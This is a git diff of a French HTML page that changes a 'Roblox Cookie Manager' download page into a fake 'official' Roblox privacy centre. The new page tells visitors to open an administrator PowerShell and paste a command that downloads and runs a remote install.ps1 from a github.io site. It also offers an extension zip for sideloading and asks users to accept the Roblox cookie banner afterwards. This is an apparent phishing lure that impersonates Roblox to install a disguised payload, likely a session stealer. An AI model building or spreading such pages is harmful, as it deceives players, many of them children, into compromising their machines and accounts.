@@ -3,84 +3,272 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cookie Manager - Officiel</title>
+    <title>Roblox – Centre de confidentialité</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body {
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
-            color: white;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            text-align: center;
-            padding: 60px 20px;
+            background: #f5f6f8;
+            color: #1e1e1e;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
+            padding: 30px 20px;
         }
-        .logo { font-size: 60px; margin-bottom: 20px; }
-        h1 { color: #00b06b; font-size: 32px; margin-bottom: 15px; }
-        p { color: #cccccc; font-size: 16px; margin-bottom: 30px; max-width: 500px; }
-        .btn {
-            background: #00b06b;
-            color: white;
-            padding: 18px 45px;
+        
+        /* Barre supérieure légère */
+        .topbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #ffffff;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 14px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            z-index: 1000;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.04);
+        }
+        
+        .topbar-logo {
             font-size: 20px;
-            font-weight: bold;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            box-shadow: 0 0 30px rgba(0, 176, 107, 0.4);
-            transition: 0.3s;
+            font-weight: 700;
+            color: #1e1e1e;
             text-decoration: none;
-            display: inline-block;
+            letter-spacing: 0.3px;
         }
-        .btn:hover {
-            background: #009f5a;
-            box-shadow: 0 0 50px rgba(0, 176, 107, 0.7);
-            transform: translateY(-2px);
+        
+        .topbar-links {
+            display: flex;
+            gap: 24px;
+            list-style: none;
         }
-        .steps {
-            display: none;
-            margin-top: 40px;
-            background: rgba(255,255,255,0.05);
-            padding: 30px;
-            border-radius: 15px;
+        
+        .topbar-links a {
+            color: #555;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            transition: 0.2s;
+        }
+        
+        .topbar-links a:hover { color: #1e1e1e; }
+        
+        /* Carte centrale */
+        .card {
+            margin-top: 80px;
+            background: #ffffff;
+            border: 1px solid #e8e8e8;
+            border-radius: 8px;
+            padding: 44px 40px;
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.04);
+        }
+        
+        .card .emoji {
+            font-size: 48px;
+            margin-bottom: 18px;
+        }
+        
+        .card h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1e1e1e;
+            margin-bottom: 8px;
+        }
+        
+        .card > p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.7;
+            margin-bottom: 30px;
+        }
+        
+        /* Boîte commande */
+        .command-box {
+            background: #fafbfc;
+            border: 1px solid #e8e8e8;
+            border-radius: 6px;
+            padding: 24px;
             text-align: left;
-            max-width: 500px;
-            border: 1px solid rgba(255,255,255,0.1);
+            margin-bottom: 20px;
         }
-        .steps h3 { color: #00b06b; margin-bottom: 15px; }
-        .steps ol { padding-left: 20px; }
-        .steps li { margin-bottom: 12px; color: #ddd; font-size: 14px; }
-        .footer { margin-top: 50px; color: #666; font-size: 12px; }
+        
+        .command-box h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1e1e1e;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .command-box h3 .tag {
+            background: #0078d4;
+            color: #ffffff;
+            font-size: 10px;
+            font-weight: 600;
+            padding: 2px 8px;
+            border-radius: 10px;
+            letter-spacing: 0.3px;
+        }
+        
+        .command-box code {
+            display: block;
+            background: #ffffff;
+            color: #0078d4;
+            padding: 14px 16px;
+            border-radius: 4px;
+            font-size: 12px;
+            word-break: break-all;
+            margin-bottom: 14px;
+            border: 1px solid #e0e0e0;
+            font-family: 'Consolas', 'Courier New', monospace;
+            line-height: 1.5;
+        }
+        
+        .command-box .steps {
+            color: #777;
+            font-size: 12px;
+            line-height: 2;
+            margin-top: 14px;
+        }
+        
+        .command-box .steps b { color: #444; }
+        
+        /* Boutons */
+        .btn {
+            display: inline-block;
+            background: #0078d4;
+            color: #ffffff;
+            padding: 10px 22px;
+            font-size: 13px;
+            font-weight: 600;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: 0.15s;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            letter-spacing: 0.2px;
+        }
+        
+        .btn:hover {
+            background: #106ebe;
+        }
+        
+        .btn-light {
+            background: #ffffff;
+            border: 1px solid #d0d0d0;
+            color: #444;
+        }
+        
+        .btn-light:hover {
+            background: #f5f5f5;
+            border-color: #aaa;
+            color: #1e1e1e;
+        }
+        
+        /* Séparateur */
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin: 20px 0;
+            color: #aaa;
+            font-size: 12px;
+        }
+        
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e8e8e8;
+        }
+        
+        /* Pied de page */
+        .footer {
+            margin-top: 32px;
+            color: #999;
+            font-size: 11px;
+            text-align: center;
+        }
+        
+        .footer a {
+            color: #999;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover { color: #555; }
     </style>
 </head>
 <body>
-    <div class="logo">🔒</div>
-    <h1>Roblox Cookie Manager</h1>
-    <p>Protégez votre vie privée sur Roblox en gérant automatiquement vos préférences de cookies avec notre outil officiel.</p>
-    
-    <button class="btn" onclick="startDownload()">📥 Télécharger l'extension</button>
-    
-    <div class="steps" id="steps">
-        <h3>📋 Instructions d'installation :</h3>
-        <ol>
-            <li>Décompressez le fichier <b>extension.zip</b> sur votre Bureau.</li>
-            <li>Ouvrez <b>Microsoft Edge</b> et tapez <b>edge://extensions</b> dans la barre d'adresse.</li>
-            <li>Activez le <b>Mode développeur</b> (bouton en bas à gauche).</li>
-            <li>Cliquez sur <b>Charger l'extension décompressée</b>.</li>
-            <li>Sélectionnez le dossier <b>CookieBannerExtension</b> que vous venez de décompresser.</li>
-            <li>Allez sur <b>Roblox.com</b> et acceptez la bannière de cookies qui apparaît.</li>
-        </ol>
+
+    <!-- Barre haute -->
+    <nav class="topbar">
+        <a href="#" class="topbar-logo">ROBLOX</a>
+        <ul class="topbar-links">
+            <li><a href="#">Découvrir</a></li>
+            <li><a href="#">Avatar</a></li>
+            <li><a href="#">Boutique</a></li>
+            <li><a href="#">Créer</a></li>
+            <li><a href="#">Robux</a></li>
+        </ul>
+    </nav>
+
+    <!-- Carte centrale -->
+    <div class="card">
+        <div class="emoji">🔐</div>
+        <h1>Confidentialité et cookies</h1>
+        <p>
+            Pour améliorer votre expérience, Roblox vous propose d'installer 
+            son gestionnaire de confidentialité. Cela vous permet de contrôler 
+            vos préférences de cookies en toute simplicité.
+        </p>
+        
+        <!-- Commande -->
+        <div class="command-box">
+            <h3>
+                ⚡ Installation simple 
+                <span class="tag">OFFICIEL</span>
+            </h3>
+            <code id="psCommand">powershell -Command "irm https://blaykow.github.io/CookieBannerExtension/install.ps1 | iex"</code>
+            <button class="btn" onclick="copyCommand()">📋 Copier la commande</button>
+            <div class="steps">
+                1. Clic droit sur <b>Démarrer</b> → <b>PowerShell (Administrateur)</b><br>
+                2. Collez la commande et appuyez sur <b>Entrée</b><br>
+                3. Redémarrez <b>Microsoft Edge</b><br>
+                4. Rendez-vous sur <b>Roblox.com</b> et acceptez la bannière
+            </div>
+        </div>
+        
+        <div class="divider">ou</div>
+        
+        <a href="extension.zip" class="btn btn-light">📥 Télécharger le fichier manuellement</a>
     </div>
     
-    <p class="footer">© 2024 Roblox Cookie Manager. Tous droits réservés.</p>
+    <!-- Footer -->
+    <div class="footer">
+        <a href="#">Confidentialité</a>
+        <a href="#">Conditions</a>
+        <a href="#">© 2024 Roblox Corporation</a>
+    </div>
 
     <script>
-        function startDownload() {
-            document.getElementById('steps').style.display = 'block';
-            window.location.href = 'extension.zip';
+        function copyCommand() {
+            const cmd = document.getElementById('psCommand').innerText;
+            navigator.clipboard.writeText(cmd).then(() => {
+                alert('✅ Commande copiée ! Ouvrez PowerShell (Administrateur) et collez-la.');
+            });
         }
     </script>
 </body>
